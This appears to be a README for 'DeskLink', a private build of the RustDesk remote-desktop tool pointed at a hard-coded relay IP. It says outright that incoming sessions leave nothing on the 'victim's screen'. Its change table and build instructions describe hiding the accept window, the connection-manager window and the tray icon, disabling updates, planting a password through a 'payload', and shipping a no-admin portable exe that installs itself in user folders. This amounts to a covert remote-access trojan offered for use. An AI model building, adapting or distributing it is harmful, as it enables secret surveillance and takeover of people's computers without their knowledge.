# DeskLink

A private build of [RustDesk](https://github.com/rustdesk/rustdesk) 1.5.1 pointed at
our own relay. No public RustDesk servers are involved, no update check runs, and
an incoming session leaves nothing on the victim's screen.

- Relay: `198.84.79.130` (self-hosted `hbbs`/`hbbr`)
- Product name: `DeskLink`
- Downloads: `releases/latest/download/desklink.exe`

## What is changed against upstream 1.5.1

`patches/client.patch` holds the whole diff; in short:

| file | change |
| --- | --- |
| `libs/hbb_common/src/config.rs` | `RENDEZVOUS_SERVERS` = our relay, `RS_PUB_KEY` = our key, `APP_NAME` = `DeskLink` |
| `libs/hbb_common/src/password_security.rs` | defaults `approve-mode=password` and `verification-method=use-permanent-password`, `hide_cm()` allowed for custom builds |
| `src/tray.rs` | tray icon suppressed for custom builds |
| `build.py` | portable packer uses `sys.executable`, `os.replace` on the final rename |

Renaming `APP_NAME` also flips `is_custom_client()`, which is what disables the
upstream update check — otherwise a routine update would drop the relay back to
the public servers.

Consequences: a session needs the password only, shows no accept window, keeps
the connection-manager window hidden and leaves no tray icon. The password is
written by the payload into `%APPDATA%\DeskLink\config\RustDesk2.toml`.

## Building

`patches/fix_bridge.py` is not optional. flutter_rust_bridge 1.80.1 emits
`typedef bool = ffi.NativeFunction<...>` at the top of the generated bridge, which
shadows core `bool` for every library that imports it; the script renames the
typedef, routes `ffi.Bool` through the wire shims and pins the `dart:ffi` int
types. `build.py` calls it right after code generation.

Prerequisites on Windows: VS 2022 Build Tools (MSVC x64), LLVM, vcpkg with the
non-ffmpeg deps staged at `x64-windows-static-release`, Flutter 3.35.x, Rust
stable, `flutter_rust_bridge_codegen` 1.80.1.

```bat
git clone --recursive --branch 1.5.1 https://github.com/rustdesk/rustdesk
cd rustdesk && git apply ..\patches\client.patch
:: see patches/ for the environment exports the Windows build needs
python build.py --flutter --portable --hwcodec
```

Output is `rustdesk-1.5.1-install.exe`, a single portable exe (no installer, no
admin needed, drops itself in `%LOCALAPPDATA%`).

## Licence

AGPL-3.0, same as upstream. The patches here plus a 1.5.1 checkout are enough to
reproduce the binary.
